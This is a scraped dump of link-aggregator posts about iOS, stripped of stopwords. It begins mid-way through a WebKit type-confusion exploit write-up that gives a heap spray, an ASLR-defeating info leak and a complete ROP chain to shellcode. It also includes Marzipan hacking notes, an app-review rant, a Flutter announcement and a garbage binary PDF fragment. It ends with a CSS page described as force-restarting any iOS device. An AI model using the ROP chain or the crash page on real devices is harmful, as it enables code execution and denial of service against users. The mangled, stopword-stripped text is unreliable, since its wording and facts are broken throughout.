happen however several scenario could lead interesting result virtual method could something dangerous call outofcontext example call destructor object member could get freed object continues live could turn original useafterfree issue another useafterfree issue possibly one give u better exploitation primitive since constructfromstring take single parameter type string could potentially cause type confusion input parameter virtual method expects parameter another type additionally virtual method take parameter constructfromstring would uninitialized could also lead exploitable behavior constructfromstring expected return pointer type svganimatedtype virtual method return type lead type confusion return value additionally virtual method return anything return value remains uninitialized vtables freed object object replaced different size calling vtable pointer freed object could result outofbounds read vtable object resulting calling virtual function third class exploit used option twist understand twist let examine svganimateelementbase class closely implement functionality svg animate element svg animate element used name suggests animate property another element example following element svg image animate attributename x dur cause x coordinate target element default parent element grow duration second use animate element animate various cs xml property controlled attributename property animate element interesting part property different type example might use animate element animate x coordinate element type svglengthvalue number unit might use animate fill attribute type color svganimateelementbase class type animated property tracked via member variable declared animatedpropertytype manimatedpropertytype animatedpropertytype enumeration possible type two member variable note std uniqueptr svganimatedtypeanimator manimator std uniqueptr svganimatedtype manimatedtype manimator useafterfree object manimatedtype object created possibly freed manimator svganimatedtypeanimator type manimator superclass subclass possible value animatedpropertytype svganimatedbooleananimator svganimatedcoloranimator etc svganimatedtype type manimatedtype variant contains type union possible value depending type important thing note normally subclass manimator type manimatedtype supposed match manimatedpropertytype example manimatedpropertytype animatedboolean type manimatedtype variant manimator instance svganimatedbooleananimator type match since manimator created based manimatedpropertytype manimatedtype created manimator oh wait exactly vulnerability occurs instead replacing freed animator something completely different causing type confusion svganimatedtype another class instead replace freed animator another animator subclass confuse svganimatedtype type another svganimatedtype type b one interesting thing bug would still bug even animator object get freed case bug turn type confusion trigger one would simply change manimatedpropertytype animate element different type javascript callback examine happens detail later led discussion office whether bug called useafterfree really different type bug useafterfree merely symptom note animator object always going get freed soon type animate element change lead interesting scenario exploit bug however choose call instead replacing freed object object another type could either replace object type make sure get replaced due memory allocation webkit work latter actually going happen time anyway object allocated memory page start getting replaced whole page becomes full additionally freeing object webkit corrupt would case allocator allows u still use normally even freed let examine type confusion work effect start animate element type manimatedpropertytype manimator manimatedtype match type resetanimatedtype get called retrieves animator pointer type resetanimatedtype call computecsspropertyvalue trigger javascript callback javascript callback change type animate element b changing attributename attribute cause svganimateelementbase resetanimatedpropertytype called manimatedtype manimator get deleted manimatedpropertytype get set b according new attributename manimatedtype manimator null manimatedpropertytype b return resetanimatedtype still local variable animator still point freed still functional animator type manimatedtype get created based freed animator manimatedtype type manimatedpropertytype b manimator null resetanimatedtype return animator local variable pointing freed animator type get lost never seen eventually resetanimatedtype get called since manimator still null manimatedpropertytype b creates manimator type b since manimatedtype nonnull instead creating anew initialize calling manimatedtype setvalueasstring manimatedpropertytype type b manimator type b manimatedtype type point value animated property get calculated happens svganimateelementbase calculateanimatedvalue line calling manimator calculateanimatedvalue manimatedtype mismatch manimator type b manimatedtype type however mismatch normally occur animator check type argument might debug asserts nothing release attempt write calculated animated value type b svganimatedtype type animated value computed read string set corresponding cs property happens actual type confusion happens step write svganimatedtype type actually type b rest interaction manimatedtype dangerous since simply getting setting value string operation safe regardless actual type note although animate element support animating xml property well cs property dance cs property code handling xml property different list cs property work found exploit type confusion infoleak initial idea exploit numeric type b string way type confusion write occurs string pointer written number would able read step problem well large number type combination value read step must valid cs property value context current animated property otherwise set correctly would able read example unable find string cs property list would accept value like similar promising approach due limitation step would replace numeric type another numeric type success floatrect b svglengthlistvalues vector svglengthvalue value like result vector pointer written floatrect type sometimes lead successfully disclosing heap address sometimes cs property type svglengthlistvalues use strokedasharray strokedasharray accepts positive value thus lower heap address want disclose look like negative floating point number ie highest bit set would able disclose address problem overcome spraying heap data lower heap address start becoming positive since need heap spraying anyway another approach take approach actually ended using svglengthlistvalues strokedasharray cs property b float strokemiterlimit cs property type confusion overwrites lowest bit svglengthvalue vector floating point number trigger type confusion need spray heap approximately data doable modern computer give u good probability change original heap address resulting address still going valid heap address especially yyyyyyyy high way disclose notquitearbitrary data arbitrary offset notquitearbitrary still limitation strokemiterlimit must positive disclose data heap interpretable float svglengthvalue type consists float followed enumeration describes unit used svglengthvalue read string step unit value valid appended number eg attempt set string like strokemiterlimit property fail thus next byte heap value want read must interpret invalid unit case unit appended reading svglengthvalue string note limitation often worked around nonaligned read moreorless usable read read whole point defeat aslr read pointer executable module often exploitation one would reading vtable pointer object heap however macos appears vtable pointer point separate memory region one containing executable code corresponding module instead reading vtable pointer need read function pointer instead ended using vttregion object heap spray vttregion object contains timer contains pointer function object case contains function pointer vttregion scrolltimerfired thus spray vttregion object take second quite notstateoftheart mac mini scan resulting memory function pointer give u aslr bypass one thing useful next phase address payload rop chain shellcode disclose following step find vttregion object heap spray setting vttregionheight property heap spray index spray array identify exactly million vttregion object read set vttregionid property vttregion object payload read vttregionid pointer ready triggering vulnerability second time time code exec time classic useafterfree exploitation scenario overwrite freed svganimatedtypeanimator object data control apple recently introduced gigacage separate large region memory lot attackercontrolled datatypes string array etc longer trivial however one thing still allocated main heap vector content finding vector whose content fully control overcome heap limitation ended using temporary vector used typedarrayset called copy value one javascript typed array another typed array vector temporary meaning deleted immediately use due memory allocation work webkit horrible like stability improvement task finding permanent controllable allocation left exercise reader time javascript event handler replace freed svganimatedtypeanimator vector whose first byte set point rop chain shellcode payload rop chain pretty straightforward one thing perhaps interesting stack pivot gadget case gadget used scenario virtual function freed object called call qword ptr rax point payload additionally rsi point freed object also control first thing want rop control stack unable find classic gadget accomplish mov rsp rax ret push rax pop rsp ret xchg rax rsp ret ended breaking stack pivot two gadget push rax mov rax rsi call rax offset first gadget push payload address stack common exactly original virtual function called apart push rax epilogue instruction second gadget pop whatever pop rsp ret first pop pop return address stack second pop finally get controlled value rsp gadget le common still appears way common stack pivot mentioned previously least binary final rop chain remember start reading offset address pop pop pop ret address push rax mov rax rsi call address pop ret address pop rbp pop rsp ret address pop rdi ret address pop rsi ret shellcode length address pop rdx ret protexec protread protwrite address pop rcx ret mapanon mapprivate address pop pop rbp ret address pop ret address mmap address push rax pop rdi ret address push rsp pop rbp ret address push rbp pop rax ret address add rax pop rbp ret address push rax pop rsi pop rbp ret address pop rdx ret shellcode length address memcpy address jmp rax shellcode rop chain call mmap shellcodelength protexec protread protwrite mapanon mapprivate calculates shellcode address copy address returned mmap shellcode called case shellcode sequence int instruction reaching safari crash debugger attached see shellcode successfully reached detect breakpoint process stopped thread queue comapplemainthread stop reason excbreakpoint frame target comapplewebkitwebcontent stopped realworld scenario shellcode could either secondstage exploit break safari sandbox alternately payload would turn issue universal x stealing crossdomain data exploit successfully tested mac o build version still using version might want update full exploit seen impact recent io mitigation interesting aspect exploit safari mac o could written oldschool way infoleak rop due lack control flow mitigation platform latest mobile hardware io published exploit already written apple introduced control flow mitigation using pointer authentication code pac plan write another version exploit time interesting discus exploit could modified affected recent mitigation exploit presented consists two part infoleak getting code execution pac would affect infoleak part way however would prevent jumping rop chain second part exploit could forge correct signature vtable pointer instead jumping rop code next stage exploit would likely need getting arbitrary readwrite primitive could potentially accomplished exploiting similar type confusion used infoleak different object combination notice type combination could result write especially attacker already infoleak investigate detail webkit process attacker arbitrary readwrite primitive could find way overwrite jit code failing data would cause fully partially controlled jit code emitted achieve code execution way exploit could still written admittedly would somewhat difficult write publishing advisory concluding blog post want draw attention patch issue listed blog post announced corresponding timeline issue reported apple june july september apple published security advisory io tvos safari fixed issue however although bug fixed time corresponding advisory initially mention issue described blog post added advisory one week later september security advisory macos mojave also published demonstrate discrepancy originally published advisory updated advisory compare archived version safari advisory september current version advisory note might need refresh page still old version browser cache original advisory likely include issue apple wanted wait issue also fixed macos adding however practice misleading customer interested apple security advisory would likely read first released impression would get product update fix far le vulnerability le severe vulnerability actually case furthermore practice publishing fix mobile desktop operating system time put desktop customer unnecessary risk attacker could reverseengineer patch mobile update develop exploit desktop product desktop customer would way update protect conclusion clearly improvement webkit dom tested domato public fuzzer still able find large number interesting bug nonoverlyprohibitive number iteration public tool able find many bug expected private one might even successful easy brush away bug something seen actual attacker use mean happening happen provided exploit demonstrates exploit include sandbox escape considered full chain however report security researcher indicate aspect browser security crack fuzzing note apple security sandbox escape relies attacking windowserver access removed sandbox safari macos mojave additionally dom exploit could used steal crossdomain data cooky even without sandbox escape fuzzing result might indicate webkit getting fuzzed perhaps sufficient computing power find fuzzable newly introduced bug make release version browser hoping research lead improved user security providing incentive apple allocate resource area browser security
179,Lobsters,ios,Apple iOS,Marzipan: Porting iOS Apps to the Mac,https://pspdfkit.com/blog/2018/porting-ios-apps-to-mac-marzipan-iosmac-uikit-appkit/,marzipan porting io apps mac,slide speakerdeck great video youtube channel marzipan even drag drop work size class scale factor history timeline osmeta window bridge io chameleon project bloomberg sneak peek wwdc iosmac architecture voicememosapp voicememod uikitsystemapp uikithostappxpc great post architecture internals iosmac overview current hack great coverage steven troughtonsmith marzipanify supporting patreon disable security virtual machine always work update michael thomas porting pdf viewer mac pdf viewer pspdfkit step minimum deployment target io step remove framework step convert automate step allow swift calling convention changed become better mac citizen apple home app spelunking window toolbar controller class complete gist header never easy weak linking header bonus inspecting view hierarchy talk vlas voloshin conclusion steipete marzipandemic,macos mojave apple adding support run uikit apps macos without requirement rewriting ui appkit yet something officially supported thirdparty developer let explore expect try today article based talk presented try swift new york called hacking marzipan find slide speakerdeck sure also check great video youtube channel warning exploring iosmac platform requires hack weaken security mac use separate machine explore new technology distribute iosmac apps yet underlying framework still private likely subject change marzipan marzipan apple new io application layer mac run apps written uikit related io framework way make sense mac already run io apps mac year simulator marzipan way evolution simulator however use simulator architecture much deeply integrated includes support adding button window chrome menu bar focus ring much even drag drop work interesting fact marzipan size class scale factor everything rendered little smaller fit better mac history timeline first time uikit running platform originally designed facebook internal closed source project called osmeta basically complete rewrite uikit entire io platform microsoft project islandwood aka window bridge io github find attempt like chameleon project however uikit large beast realistically apple port awesomeness flaw mark gurman leaked news marzipan late bloomberg hardly anyone believed apple would really go path even engineer surprised craig federighi chose present sneak peek wwdc macos late official sdk thirdparty developer iosmac architecture running iosmac app spawn whole list process appkit shell display uikit app uikitsystemapp mac version frontboard applicationsvoicememosapp systemiossupportsystemlibraryprivateframeworks voicememosframeworksupportvoicememod systemlibrarycoreservicesuikitsystemapp systemlibraryprivateframeworksuikithostappservicesframework versionsaxpcservicesuikithostappxpc disguised like learn adam demasi wrote great post architecture internals iosmac overview current hack apple testing new platform stage macos mojave delivers phase new appleprovided apps running iosmac phase developer get access platform however various way work around apple current restriction marzipan micha≈Ç ka≈Çu≈ºny hack one first deserves special mention piggyback apple iosmac apps injects code app convert app much like virus entering cell causing thing cell made approach scale ka≈Çu≈ºny get point creativity early marzipanplatter best choice converting io apps macos successfully ported pdf viewer mojave beta mac however approach mixed uikit appkit flawed got great coverage steven troughtonsmith offer complete conversion tool marzipanify currently best way port app basically performs following action add marzipan glue patch infoplist modifies mach header add private iosmac entitlement use marzipanify article shoutout steven amazing tool find useful consider supporting patreon disable security apple locked thing quite bit make iosmac apps box least without hack hack discussed need disable apple system integrity protection something generally mentioned good idea use separate machine experiment hack used also need disable sandboxing apple control apps get private iosmac entitlement without magic amfigetoutofmyway boot argument experiment terminated get chance run amfi short applemobilefileintegrity virtual machine always work iosmac platform requires gpu acceleration simply exit available update seems apple actively working deficiency mojave beta apps including home pdf viewer mac run inside vm news still fails load shoutout michael thomas pinging change porting pdf viewer mac pdf viewer fairly complex io application written c c objectivec swift based pspdfkit million line code development since make pretty compelling test case step minimum deployment target io need ensure minimum deployment target project dependent framework set io linker emits lcbuildversion flag v earlier lcbuildversionminmacos io set required iosmac load correct dependency marzipanify try work around cause lot trouble might end binary start one moment using one central xcconfig file really pay step remove framework remove code us deprecated feature iosmac new platform include class already deprecated likely issue uiwebview still ubiquitous despite faster wkwebview available many year framework available except make sense port mac like one safariservicesframework sfsafariviewcontroller make sense mac use openurl coretelephonyframework cttelephonynetworkinfo especially socialframework slcomposeviewcontroller messageuiframework mfmailcomposeviewcontroller openglesframework rewritten metal addressbookframework new framework exists guaranteed symbol available example using uimarkuptextprintformatter part uikit since io iosmac startup quickly see symbol missing following incomplete list symbol available uiimpactfeedbackgenerator mac way generate haptic feedback nop instead uiprintinfo probably related uiwebview missing uiviewcontroller setneedsupdateofhomeindicatorautohidden mojave uikit branch might cut iphone x branch merged uidocumentbrowser document browser concept make sense mac phcachingimagemanager photosframework problem chose hybrid approach resolve issue via patchadding missing symbol small glue file called uikitiosmacfixesm step convert automate since using marzipanify requires additional step recommendation automate conversion process try adding automation script xcode build setting running small script seemed good enough lldb ready type run step allow swift one took long time understand system complains swift support library built iosmac manually copied systemlibraryprivateframeworksswift however almost nothing worked anymore thing constantly crashed weird overrelease issue using swift swift support library systemlibraryprivateframeworksswift older version point recently calling convention changed basic calling objectivec bridged class still worked thing broke soon complex call like calling bundlemainbundleurl edit systemiossupportdyldmacoswhitelisttxt append applicationspdfviewermacappcontentsmacos replace path path binary dependency load appkit process iosmac refuse load unless run via lldb however good reason appkit blocked modifiesclashes many uikit internals app likely crash startup render font ever get crash uilabel nswidgettype know case photosframework caused appkit loaded fix found remove photo reference application use select image image annotation however minor feature app work great without pdf viewer look mac file picker concept something would ship macos ok hack work great including directory watcher new file added become better mac citizen looking toolbar quite done good mac citizen mean use native toolbar like apple home app see done usually spelunking ida hopper great disassembling peeking inside apple apps opening home app hopper searching toolbar responsible class easy find apple apps use window toolbar controller class manage window controller surprise uiwindowtoolbarcontroller class look interesting would get one bit trickier found uikitcore eventually complete gist header ok really surprising linker like declare class provide implementation obviously part io uikit one took course every problem solution many year back apple added weak linking class entire framework weak linked could extract framework exactly want get something going quickly simply weak link per class instructs compiler weak link specified class link let run never easy runtime seem happy symbol told linker thing might available yet told runtime let fix weak linking header weakimport attribute tell runtime method might available case resolved nil look action bonus inspecting view hierarchy manage trigger xcode view debugger talk vlas voloshin mentioned reveal work change mojave later beta prevented loading reveal server awesome team itty bitty apps went extra mile made release compatible iosmac platform simple reveal load debugger console trick conclusion porting io apps mac exciting easier ever apple new iosmac platform trick possible port entire large complex application le day choosing next experimental friday hackathon project ping steipete twitter show u result let marzipandemic commence
180,Lobsters,ios,Apple iOS,Rejected,http://www.eod.com/blog/2018/09/rejected/,rejected,pert headquarters romantimatic applecom iphone battery throttling,september apple inc may heard held big event cupertino headquarters spanish pert headquarters announce latest model utterly beloved nightmare machine iphone xr iphone x iphone x max seriously making last one september updated romantimatic heard work new model submitted app store place get appetizer iphone app store managed apple includes fairly strict set rule program available effectively giving apple complete control expensive device customer purchased fun previously caused controversy fart app space release detail new version software included following note added support iphone xr iphone x max iphone x size previous generation iphone x update needed apple responded rejection actually explain wrong developercommunity scuttlebutt apple prohibited mention new model delightfully buttery black obelisk death release note phone actually know released despite fact several white men artfully casual jean spent hour talking model previous week name currently plastered applecom web site music company founded beatles september modified release note resubmitted app added support theoretical new iphones mentioned release note even though announced huge event apple headquarters currently featured apple website note mention name iphone xr iphone x max however apple responded rejection apple apparently considers referencing device application designed run relevant functionality september squared shoulder modified release note resubmitted app change made tell change disallowed section program license agreement tell disallowed section app store review guideline leaf app state quantum indeterminacy waveform collapse someone app store review stop observing apple sensing might taking process seriously responded literally hear message sigh clearly obstinate jerk told write know look world nightmarish hellscape unending despair hill decided plant flag tiny bit sanity common sense might make fractional headway rote devotion nolongerrelevant rule given apple ad budget entire observable universe aware newmodel iphones called simply reason accurately reflect release note make note worse end particular road sign say bug fixed today september call patient member app store review team reminded inappropriate comment app store review policy release note asked might able know mention app support redacted said iphones x x max referenced since shipped however including phrase iphone xr alluding announced advertised demoed technically theoretical new phone result another rejection october something released maybe flamethrower humane treatment foxconn worker phone le paid first car say know ridiculous fight know agreed particular barrel foolishness signed apple developer know small potato country fire know million people battling every day dignity family life goddammit bridge stupid cross fly pirate flag toss hammer big brother think different violate section program license agreement communicate user word billboard drove past way work rebel somewhere else thought experience iphone battery throttling apple lowest thoughtless arrogant selfsatisfied particular rodeo manages stumble past sound technical decision accompanied silence denial make sense galactically stupid wholly unnecessary purely arbitrary policy clearly communicated corporate equivalent trump tweet apple website iphone xr section beautiful show phone multiple color stark black background brilliant say every way actually think one case true
181,Lobsters,ios,Apple iOS,Flutter Release Preview 2: Pixel-Perfect on iOS,https://developers.googleblog.com/2018/09/flutter-release-preview-2-pixel-perfect.html,flutter release preview pixelperfect io,flutter release preview beta release release preview new release preview pixelperfect io apps apple interface guideline extensive library widget class built flutter documentation visual widget catalog medium article reduction application package size minimal flutter app io package built growing momentum android io android io android io android io recent survey dart programming language stackoverflow day one getting started upgrade flutterio fluttersamples curated list sample handson video newsletter community article developer show discussion group chat room community support weekly online hangout,posted flutter team google flutter google new mobile app toolkit crafting beautiful native interface io android record time today keynote google developer day shanghai announcing flutter release preview last major milestone flutter release continues work completing core scenario improving quality beginning initial beta release february availability first release preview earlier summer team fully focused completing release new release preview theme release pixelperfect io apps designed flutter highly branddriven tailored experience mind heard feedback wanted build application closely follow apple interface guideline release greatly expanded support cupertino themed control flutter extensive library widget class make easier ever build io mind reproduction io setting home page built flutter new iosthemed widget added flutter release preview updated ever flutter documentation place go detailed information cupertino class note time writing still working add new cupertino widget visual widget catalog made progress complete scenario also taking look hood support added executing dart code background even application suspended plugin author take advantage create new plugins execute code upon event triggered firing timer receipt location update detailed introduction read medium article demonstrates use background execution create geofencing plugin another improvement reduction application package size android io minimal flutter app android weighs built release mode saving since started effort continuing identify potential optimization note improvement affect io android may see different result io io package built video growing momentum many new developer continue discover flutter humbled note flutter one top active software repository github declared flutter production ready google io year flutter getting ever closer stable release many new flutter application released thousand flutterbased apps already appearing apple google play store include largest application planet usage alibaba android io tencent android io google ad android io video alibaba used flutter build xianyu app android io currently used million customer china video take customer satisfaction seriously regularly survey user promised share result back community recent survey show developer satisfied satisfied flutter would recommend flutter others come fast development beautiful uis found flutter extremely helpful helpful reaching maximum engineering velocity implementing ideal ui flutter developer satisfied satisfied dart programming language recently celebrated hitting release milestone dart flutter strong community growth felt way stackoverflow see fast growing interest flutter lot new question posted answered viewed chart show number stackoverflow question view tagged four popular ui framework time flutter open source day one design goal transparent progress encourage contribution individual company share desire see beautiful user experience platform getting started upgrade flutter release preview beta channel already take one command flutter upgrade check release preview installed running flutter version command line version later everything described post nt tried flutter yet perfect time flutterio detail download flutter get started first app ready whole ecosystem example apps code snippet help get going find sample flutter team fluttersamples repo github covering thing like use material cupertino approach deserializing data encoded json also curated list sample link best example created flutter community also learn stay date flutter handson video newsletter community article developer show discussion group chat room community support weekly online hangout available help along way build application release preview last release preview next stop
182,Lobsters,ios,Apple iOS,Heapple Pie - The macOS/iOS default heap,https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf,heapple pie macosios default heap,,√§√º√∂√ü obj stream ËÑúg »è l √¥uy f oq gÏ™äm c c
183,Lobsters,ios,Apple iOS,Force Restart Any iOS Device Using CSS,https://gist.github.com/pwnsdx/ce64de2760996a6c432f06d612e33aea,force restart io device using cs,reload reload,instantly share code note snippet doctype html html head meta httpequiv contenttype content texthtml style body background repeat url data imagejpeg div backdropfilter blur webkitbackdropfilter blur style head body div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div div 